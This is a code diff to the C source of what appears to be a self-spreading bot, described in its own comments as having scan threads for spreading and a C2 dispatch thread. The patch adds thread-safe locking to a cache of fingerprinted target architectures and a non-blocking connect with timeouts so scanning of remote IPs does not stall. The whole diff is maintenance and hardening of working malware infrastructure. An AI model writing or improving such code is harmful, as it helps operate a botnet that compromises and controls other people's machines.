@@ -36,6 +36,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <pthread.h>
 #include <netdb.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
@@ -60,9 +61,15 @@ typedef struct {
 
 static arch_cache_entry_t arch_cache[ARCH_CACHE_MAX];
 static int arch_cache_count = 0;
+/* arch_detect() runs on concurrent scan threads (spread) and the C2
+ * dispatch thread — all cache access goes through this mutex. The
+ * find/store helpers below expect the caller to hold it. */
+static pthread_mutex_t g_arch_cache_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 void arch_cache_reset(void) {
+    pthread_mutex_lock(&g_arch_cache_mutex);
     arch_cache_count = 0;
+    pthread_mutex_unlock(&g_arch_cache_mutex);
 }
 
 static const arch_cache_entry_t *arch_cache_find(const char *ip) {
@@ -107,10 +114,36 @@ static int arch_http_get(const char *ip, uint16_t port,
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 
-    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
+    /* connect() is not bounded by SO_RCVTIMEO/SO_SNDTIMEO on Linux —
+     * against a blackholed IP the SYN retry ladder blocks ~2 minutes.
+     * Non-blocking connect + select, same pattern as relay_tcp_connect. */
+    int fl = fcntl(sock, F_GETFL, 0);
+    if (fl < 0 || fcntl(sock, F_SETFL, fl | O_NONBLOCK) < 0) {
         close(sock);
         return -1;
     }
+    int c = connect(sock, (struct sockaddr *)&sa, sizeof(sa));
+    if (c != 0 && errno != EINPROGRESS) {
+        close(sock);
+        return -1;
+    }
+    if (c != 0) {
+        fd_set wfds;
+        FD_ZERO(&wfds);
+        FD_SET(sock, &wfds);
+        if (select(sock + 1, NULL, &wfds, NULL, &tv) <= 0) {
+            close(sock);
+            return -1;
+        }
+        int soerr = 0;
+        socklen_t elen = sizeof(soerr);
+        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &soerr, &elen) < 0 ||
+            soerr != 0) {
+            close(sock);
+            return -1;
+        }
+    }
+    fcntl(sock, F_SETFL, fl);   /* back to blocking for the exchange */
 
     char req[128];
     snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
@@ -246,12 +279,20 @@ const char *arch_detect(const char *ip, uint16_t port,
                         char *out, size_t out_len) {
     if (!ip || !*ip) return ARCH_UNKNOWN;
 
+    pthread_mutex_lock(&g_arch_cache_mutex);
     const arch_cache_entry_t *hit = arch_cache_find(ip);
     if (hit) {
+        /* Snapshot under the lock: a concurrent store may shift entries
+         * while we format. The table is static storage, so hit itself
+         * stays dereferenceable regardless. */
+        arch_cache_entry_t snap = *hit;
+        pthread_mutex_unlock(&g_arch_cache_mutex);
         if (out && out_len > 0)
-            snprintf(out, out_len, "%s ttl=%d src=cache", hit->arch, hit->ttl);
+            snprintf(out, out_len, "%s ttl=%d src=cache", snap.arch,
+                     snap.ttl);
         return hit->arch;
     }
+    pthread_mutex_unlock(&g_arch_cache_mutex);
 
     const char *arch = ARCH_UNKNOWN;
     const char *src = "none";
@@ -276,7 +317,9 @@ const char *arch_detect(const char *ip, uint16_t port,
         }
     }
 
+    pthread_mutex_lock(&g_arch_cache_mutex);
     arch_cache_store(ip, arch, src, ttl);
+    pthread_mutex_unlock(&g_arch_cache_mutex);
     log_debug("ARCH: %s -> %s (ttl=%d src=%s)", ip, arch, ttl, src);
     if (out && out_len > 0)
         snprintf(out, out_len, "%s ttl=%d src=%s", arch, ttl, src);
